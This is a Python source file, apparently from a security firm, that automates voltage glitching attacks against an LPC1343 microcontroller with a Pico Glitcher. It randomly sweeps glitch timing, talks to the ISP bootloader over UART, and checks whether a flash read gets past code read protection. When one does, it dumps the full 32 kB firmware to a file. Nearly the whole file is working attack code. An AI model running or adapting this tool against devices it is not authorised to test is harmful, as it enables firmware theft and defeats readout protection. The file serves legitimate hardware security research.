#!/usr/bin/env python3
# -*- conding: utf-8 -*-

"""
  LPC1343 PicoGlitcher

  by Matthias Deeg (@matthiasdeeg, matthias.deeg@syss.de)

  Python script for voltage glitching attacks against an LPC1343 using
  the Pico Glitcher by Dr. Matthias Kesenheimer

  Based on a Pico Glitcher example by Dr. Matthias Kesenheimer

  Copyright (C) 2025 Matthias Deeg, SySS GmbH
  Copyright (C) 2024 Dr. Matthias Kesenheimer - All Rights Reserved.
  You may use, distribute and modify this code under the terms of the GPL3 license.

  You should have received a copy of the GNU General Public License
  along with this program.  If not, see <http://www.gnu.org/licenses/>.
"""

import argparse
import logging
import random
import serial
import sys
import time

from codecs import decode
from findus import Database, PicoGlitcher


class DerivedGlitcher(PicoGlitcher):
    """Derived PicoGlitcher with custom classification"""

    def classify(self, state):
        if b"Trigger OK" in state:
            color = "G"
        elif b"Sync error" in state:
            color = "M"
        elif b"Timeout" in state:
            color = "Y"
        elif b"Success" in state:
            color = "R"
        else:
            color = "C"

        return color


class LPC1343_Glitcher:
    """LPC1343 Glitcher"""

    # some definitions
    CRLF = b"\r\n"
    CR = b"\r"
    SYNCHRONIZED = b"Synchronized"
    OK = b"OK"
    READ_FLASH_CHECK = b"R 0 4"
    CRYSTAL_FREQ = b"10000" + CRLF
    MAX_BYTES = 20
    DUMP_FILE = "memory.bin"

    def __init__(self, args):
        self.args = args

        # logging
        logging.basicConfig(filename="execution.log", filemode="a", format="%(asctime)s %(message)s", level=logging.INFO, force=True)

        # PicoGlitcher
        self.glitcher = DerivedGlitcher()

        # if argument args.power is not provided, the internal power-cycling capabilities of the pico-glitcher will be used. In this case, ext_power_voltage is not used.
        self.glitcher.init(port=args.rpico, ext_power=args.power, ext_power_voltage=3.3)

        # set trigger on rising edge of reset line (RESET and GLITCH_EN are connected)
        self.glitcher.rising_edge_trigger(pin_condition='reset')

        # choose multiplexing or crowbar glitching
        self.glitcher.set_lpglitch()

        # set up the database
        self.database = Database(sys.argv, resume=self.args.resume, nostore=self.args.no_store)

        # set start time
        self.start_time = int(time.time())

        # set flag for dumping the firmware
        if args.dump:
            self.dump = True
        else:
            self.dump = False

        # initialize serial port
        self.serial = serial.Serial(port=args.target, baudrate=115200, timeout=0.1, bytesize=8, parity=serial.PARITY_NONE)


    def synchronize(self):
        """UART synchronization with auto baudrate detection"""

        # use auto baudrate detection
        cmd = b"?"
        self.serial.write(cmd)

        # receive synchronized message
        resp = self.serial.read(len(self.SYNCHRONIZED + self.CRLF))

        if resp != self.SYNCHRONIZED + self.CRLF:
            return False

        # respond with "Synchronized"
        cmd = self.SYNCHRONIZED + self.CRLF
        self.serial.write(cmd)

        # read echo (only user CR)
        self.serial.read(len(cmd) - 1)

        # read response, should be "OK"
        resp = self.serial.read(len(self.OK + self.CRLF))
        if resp != self.OK + self.CRLF:
            return False

        # send crystal frequency (in kHz)
        self.serial.write(self.CRYSTAL_FREQ)

        # read echo (only uses CR)
        self.serial.read(len(self.CRYSTAL_FREQ) - 1)

        # read response, should be "OK"
        resp = self.serial.read(len(self.OK + self.CRLF))
        if resp != self.OK + self.CRLF:
            return False

        return True


    def read_command_response(self, response_count, echo=True, terminator=b"\r\n"):
        """Read command response from target device"""

        result = []
        data = b""

        # if echo is on, read the sent back ISP command before the actual response
        count = 0
        if echo:
            c = b"\x00"
            while c != b"\r":
                count += 1
                c = self.serial.read(1)

                if count > self.MAX_BYTES:
                    return "TIMEOUT"

        # read return code
        data = b""
        old_len = 0
        count = 0
        while True:
            data += self.serial.read(1)

            if data[-2:] == terminator:
                break

            if len(data) == old_len:
                count += 1

                if count > self.MAX_BYTES:
                    return "TIMEOUT"
            else:
                old_len = len(data)

        # add return code to result
        return_code = data.replace(self.CRLF, b"")
        result.append(return_code)

        # check return code and return immediately if it is not "CMD_SUCCESS"
        if return_code != b"0":
            return result

        # read specified number of responses
        for _ in range(response_count):
            data = b""
            count = 0
            old_len = 0
            while True:
                data += self.serial.read(1)
                if data[-2:] == terminator:
                    break

                if len(data) == old_len:
                    count += 1

                    if count > self.MAX_BYTES:
                        return "TIMEOUT"
                else:
                    old_len = len(data)

            # add response to result
            result.append(data.replace(self.CRLF, b""))

        return result


    def send_target_command(self, command, response_count=0, echo=True, terminator=b"\r\n"):
        """Send command to target device"""

        # send command
        cmd = command + b"\x0d"
        self.serial.write(cmd)

        # read response
        response = self.read_command_response(response_count, echo, terminator)

        return response


    def dump_memory(self):
        """Dump the target device memory"""

        # dump the 32 kB flash memory and save the content to a file
        with open(self.DUMP_FILE, "wb") as f:

            # read all 32 kB of flash memory
            for i in range(1023):
                # first send "OK" to the target device
                resp = self.send_target_command(self.OK, 1, True, b"\r\n")

                # then a read command for 32 bytes
                cmd = "R {} 32".format(i * 32).encode("utf-8")
                resp = self.send_target_command(cmd, 1, True, b"\r\n")

                if resp[0] == b"0":
                    # read and decode uu-encodod data in a somewhat "hacky" way
                    data = b"begin 666 <data>\n" + bytes(resp[1]) + b" \n \nend\n"
                    raw_data = decode(data, "uu")
                    print(bytes.hex(raw_data))
                    f.write(raw_data)

        print("[*] Dumped memory written to '{}'".format(self.DUMP_FILE))


    def run(self):
        # log execution
        logging.info(" ".join(sys.argv))

        s_length = self.args.length[0]
        e_length = self.args.length[1]
        s_delay = self.args.delay[0]
        e_delay = self.args.delay[1]

        experiment_id = 0
        response = b""

        while True:
            # set up glitch parameters (in nano seconds) and arm glitcher
            length = random.randint(s_length, e_length)
            delay = random.randint(s_delay, e_delay)
            self.glitcher.arm(delay, length)

            # reset target
            self.glitcher.reset(0.02)

            # block until glitch
            try:
                self.glitcher.block(timeout=1)
                response = b"Trigger OK"
            except Exception as _:
                response = b"Timeout"
                self.glitcher.power_cycle_target(0.05)

                # reinitialize serial communication
                self.serial = serial.Serial(port=args.target, baudrate=115200, timeout=0.1, bytesize=8, parity=serial.PARITY_NONE)

            # synchronize
            if not self.synchronize():
                response = b"Sync error"
                self.glitcher.power_cycle_target(0.05)

                # reinitialize serial communication
                self.serial = serial.Serial(port=args.target, baudrate=115200, timeout=0.1, bytesize=8, parity=serial.PARITY_NONE)
            else:
                # read flash memory address
                response_code = self.send_target_command(self.READ_FLASH_CHECK, 1, True, b"\r\n")

                if response_code[0] == b"0":
                    response = b"Success"

            # classify response
            color = self.glitcher.classify(response)

            # add to database
            response_str = str(response).encode("utf-8")
            self.database.insert(experiment_id, delay, length, color, response_str)

            # monitor
            speed = self.glitcher.get_speed(self.start_time, experiment_id)
            experiment_base_id = self.database.get_base_experiments_count()
            print(self.glitcher.colorize(f"[+] Experiment {experiment_id}\t{experiment_base_id}\t({speed})\t{length}\t{delay}\t{color}\t{response.decode('utf-8')}", color))

            # increase experiment ID
            experiment_id += 1

            # dump the firmware if requested and a glitch was successful 
            if self.dump and response == b"Success":
                # dump memory
                print("[*] Dumping the flash memory ...")
                self.dump_memory()
                sys.exit(1)


# main program
if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", required=False, help="target port", default="/dev/ttyUSB1")
    parser.add_argument("--rpico", required=False, help="rpico port", default="/dev/ttyUSB2")
    parser.add_argument("--power", required=False, help="rk6006 port", default=None)
    parser.add_argument("--delay", required=True, nargs=2, help="delay start and end", type=int)
    parser.add_argument("--length", required=True, nargs=2, help="length start and end", type=int)
    parser.add_argument("--resume", required=False, action='store_true', help="if an previous dataset should be resumed")
    parser.add_argument("--no-store", required=False, action='store_true', help="do not store the run in the database")
    parser.add_argument("--dump", required=False, action='store_true', help="dump the firmware")
    args = parser.parse_args()

    # create PicoGlitcher
    glitcher = LPC1343_Glitcher(args)

    try:
        glitcher.run()
    except KeyboardInterrupt:
        print("\n[*] Exiting ...")
        sys.exit(1)

